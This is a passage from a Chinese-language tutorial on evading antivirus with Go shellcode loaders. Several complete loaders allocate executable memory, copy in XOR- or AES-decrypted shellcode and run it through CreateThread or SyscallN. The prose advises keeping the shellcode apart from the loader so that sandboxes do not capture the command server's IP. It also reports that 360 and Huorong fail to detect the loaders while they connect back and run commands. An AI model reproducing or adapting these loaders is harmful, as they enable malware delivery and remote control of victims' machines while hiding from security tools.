        lpMem, _, _ := 函数调用(申请虚拟内存, uintptr(0), uintptr(len(buf)), 提交物理内存|保留线性地址, 内存页可读可写可执行)
        _, _, _ = 函数调用(内存复制, lpMem, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
        hThread, _, _ := 函数调用(创建线程, 0, 0, lpMem, 0, 0, 0)
        _,_,_ = 函数调用(线程等待,hThread,uintptr(0xffffffff))
        //函数调用(lpMem)
        _ = syscall.FreeLibrary(Kernel32)
    }
加载器相对来说丢给沙箱会比较安全，因为直接在程序里贴shellcode沙箱分析会截取到服务器的ip，从而暴露自己，相对的如果钓鱼用加载器的话就需要有载体存储shellcode否则只有加载器也没用。。以加载器的形式360扫描不报毒，正常上线执行指令。
#### 0x2 LoadDLL方式获取获取函数
    /*
    time: 2022-04-24 2:00
    file: main.go
    */
    package main
    import (
        "syscall"
        "unsafe"
    )
    const (
        提交物理内存     = 0x1000 // Mem_Commit
        保留线性地址     = 0x2000 // Mem_Reserve
        内存页可读可写可执行 = 0x40   // Page_Execute_ReadWrite
    )
    var (
        Kernel32, _ = syscall.LoadDLL("Kernel32.dll")
        创建线程, _     = Kernel32.FindProc("CreateThread")
        申请虚拟内存, _   = Kernel32.FindProc( "VirtualAlloc")
        内存复制, _     = Kernel32.FindProc( "RtlMoveMemory")
        线程等待,_ = Kernel32.FindProc( "WaitForSingleObject")
    )
    func main() {
        /*xor*/
        buf := []byte{206,122,177,...}
        for i:=0;i
    // Aes CBC模式加解密
    /*
    time: 2022-04-24 2:00
    file: main.go
    */
    package main
    import (
        "bytes"
        "crypto/aes"
        "crypto/cipher"
        "encoding/hex"
        "fmt"
    )
    // 位数填充
    func pkcs5Padding(ciphertext []byte, blockSize int) []byte {
        padding := blockSize - len(ciphertext)%blockSize
        padtext := bytes.Repeat([]byte{byte(padding)}, padding)
        return append(ciphertext, padtext...)
    }
    func pkcs5UnPadding(origData []byte) []byte {
        length := len(origData)
        unpadding := int(origData[length-1])
        return origData[:(length - unpadding)]
    }
    func AesDecryptCBC(encrypted []byte, key []byte) (decrypted []byte) {
        block, _ := aes.NewCipher(key)                              // 分组秘钥
        blockSize := block.BlockSize()                              // 获取秘钥块的长度
        blockMode := cipher.NewCBCDecrypter(block, key[:blockSize]) // 加密模式
        decrypted = make([]byte, len(encrypted))                    // 创建数组
        blockMode.CryptBlocks(decrypted, encrypted)                 // 解密
        decrypted = pkcs5UnPadding(decrypted)                       // 去除补全码
        return decrypted
    }
    func AesEncryptCBC(origData []byte, key []byte) (encrypted []byte) {
        // 分组秘钥
        // NewCipher该函数限制了输入k的长度必须为16, 24或者32
        block, _ := aes.NewCipher(key)
        blockSize := block.BlockSize()                              // 获取秘钥块的长度
        origData = pkcs5Padding(origData, blockSize)                // 补全码
        blockMode := cipher.NewCBCEncrypter(block, key[:blockSize]) // 加密模式
        encrypted = make([]byte, len(origData))                     // 创建数组
        blockMode.CryptBlocks(encrypted, origData)                  // 加密
        return encrypted
    }
    func main() {
        buf := []byte("\xfc\x48\x83...")
        /*aes*/
        // 加密
        key := []byte("0123456789123456")
        enc := AesEncryptCBC(buf,key)
        dst := make([]byte,2048)
        n := hex.Encode(dst,enc)
        // 解密
        enc,_ = hex.DecodeString(string(dst[:n]))
        dec := AesDecryptCBC(enc,key)
        fmt.Println(string(dec))
    }
加载器代码，这里的key可以选择外部接收，也可以选择放在内部。
    /*
    time: 2022-04-24 2:00
    file: main.go
    Author: ILU
    */
    package main
    import (
        "bytes"
        "crypto/aes"
        "crypto/cipher"
        "encoding/hex"
        "os"
        "syscall"
        "unsafe"
    )
    const (
        提交物理内存     = 0x1000 // Mem_Commit
        保留线性地址     = 0x2000 // Mem_Reserve
        内存页可读可写可执行 = 0x40   // Page_Execute_ReadWrite
    )
    var (
        Kernel32 = syscall.MustLoadDLL("Kernel32.dll")
        创建线程     = Kernel32.MustFindProc("CreateThread")
        申请虚拟内存   = Kernel32.MustFindProc("VirtualAlloc")
        内存复制     = Kernel32.MustFindProc("RtlMoveMemory")
        线程等待     = Kernel32.MustFindProc("WaitForSingleObject")
    )
    // 位数填充
    func pkcs5Padding(ciphertext []byte, blockSize int) []byte {
        padding := blockSize - len(ciphertext)%blockSize
        padtext := bytes.Repeat([]byte{byte(padding)}, padding)
        return append(ciphertext, padtext...)
    }
    func pkcs5UnPadding(origData []byte) []byte {
        length := len(origData)
        unpadding := int(origData[length-1])
        return origData[:(length - unpadding)]
    }
    func AesDecryptCBC(encrypted []byte, key []byte) (decrypted []byte) {
        block, _ := aes.NewCipher(key)                              // 分组秘钥
        blockSize := block.BlockSize()                              // 获取秘钥块的长度
        blockMode := cipher.NewCBCDecrypter(block, key[:blockSize]) // 加密模式
        decrypted = make([]byte, len(encrypted))                    // 创建数组
        blockMode.CryptBlocks(decrypted, encrypted)                 // 解密
        decrypted = pkcs5UnPadding(decrypted)                       // 去除补全码
        return decrypted
    }
    func AesEncryptCBC(origData []byte, key []byte) (encrypted []byte) {
        // 分组秘钥
        // NewCipher该函数限制了输入k的长度必须为16, 24或者32
        block, _ := aes.NewCipher(key)
        blockSize := block.BlockSize()                              // 获取秘钥块的长度
        origData = pkcs5Padding(origData, blockSize)                // 补全码
        blockMode := cipher.NewCBCEncrypter(block, key[:blockSize]) // 加密模式
        encrypted = make([]byte, len(origData))                     // 创建数组
        blockMode.CryptBlocks(encrypted, origData)                  // 加密
        return encrypted
    }
    func main() {
        // 解密
        dst := os.Args[1]
        enc,_ := hex.DecodeString(dst)
        buf := AesDecryptCBC(enc,key)
        lpMem, _, _ := 申请虚拟内存.Call(uintptr(0), uintptr(len(buf)), 提交物理内存|保留线性地址, 内存页可读可写可执行)
        _, _, _ = 内存复制.Call(lpMem, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
        _, _, _ = syscall.SyscallN(lpMem)
        _ = Kernel32.Release()
    }
#### 0x04 NewLazyDLL方式获取获取函数
其实都差不多了，最后一点就偷个懒好了，不做过多的处理了。
    /*
    time: 2022-04-24 2:00
    file: main.go
    */
    package main
    import (
        "syscall"
        "unsafe"
    )
    const (
        提交物理内存     = 0x1000 // Mem_Commit
        保留线性地址     = 0x2000 // Mem_Reserve
        内存页可读可写可执行 = 0x40   // Page_Execute_ReadWrite
    )
    var (
        Kernel32 = syscall.NewLazyDLL("Kernel32.dll")
        创建线程     = Kernel32.NewProc("CreateThread")
        申请虚拟内存   = Kernel32.NewProc("VirtualAlloc")
        内存复制     = Kernel32.NewProc("RtlMoveMemory")
        线程等待     = Kernel32.NewProc("WaitForSingleObject")
    )
    func main() {
        /*xor*/
        buf := []byte{206, 122, 177...}
        for i := 0; i < len(buf); i++ {
            buf[i] ^= 50
        }
        lpMem, _, _ := 申请虚拟内存.Call(uintptr(0), uintptr(len(buf)), 提交物理内存|保留线性地址, 内存页可读可写可执行)
        _, _, _ = 内存复制.Call(lpMem, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)))
        _, _, _ = syscall.SyscallN(lpMem)
    }
本地火绒检测不报毒，正常执行指令！
到这里篇幅也挺长了，本篇的golang免杀基础就告一段落了，下次再会！